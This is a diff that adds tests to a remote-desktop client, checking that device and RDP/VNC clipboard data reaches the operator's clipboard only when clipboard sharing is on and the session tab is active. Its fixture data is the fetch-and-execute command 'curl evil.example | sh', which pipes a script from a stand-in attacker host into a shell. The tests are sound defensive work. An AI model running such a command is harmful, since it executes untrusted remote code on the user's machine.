@@ -288,3 +288,45 @@ describe('device identity and encryption (file transfer session)', () => {
 		await expect(t.login).rejects.toThrow(/^Handshake failed: /);
 	});
 });
+
+describe('device clipboard', () => {
+	const entry = () => ({ content: new TextEncoder().encode('curl evil.example | sh'), format: 0 });
+
+	test('Disable clipboard keeps the device clipboard out of the operator clipboard, also when set before streaming', async () => {
+		const c = await client();
+		const write = vi.spyOn(g.RDClipboard, 'writeLocalRich').mockResolvedValue({ ok: true });
+		c.setDisableClipboard(true);
+		c._state = 'streaming';
+		await c._applyRemoteClipboard([entry()]);
+		expect(write).not.toHaveBeenCalled();
+
+		c.setDisableClipboard(false);
+		await c._applyRemoteClipboard([entry()]);
+		expect(write).toHaveBeenCalledOnce();
+	});
+});
+
+describe('RDP and VNC clipboard', () => {
+	const Session = loadScripts(['remote-target.js'], ['RemoteTargetSession']).RemoteTargetSession;
+
+	function clipboardStream(s: Loaded) {
+		s._handle(['clipboard', '1', 'text/plain']);
+		s._handle(['blob', '1', btoa('curl evil.example | sh')]);
+		s._handle(['end', '1']);
+	}
+
+	test('writes to the operator clipboard only for the active tab and with the clipboard on', () => {
+		const writeText = vi.fn(async () => {});
+		Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true });
+		const s = new Session(document.createElement('canvas'), {});
+		s.setDisableClipboard(true);
+		clipboardStream(s);
+		s.setDisableClipboard(false);
+		s.setSessionActive(false);
+		clipboardStream(s);
+		expect(writeText).not.toHaveBeenCalled();
+		s.setSessionActive(true);
+		clipboardStream(s);
+		expect(writeText).toHaveBeenCalledWith('curl evil.example | sh');
+	});
+});
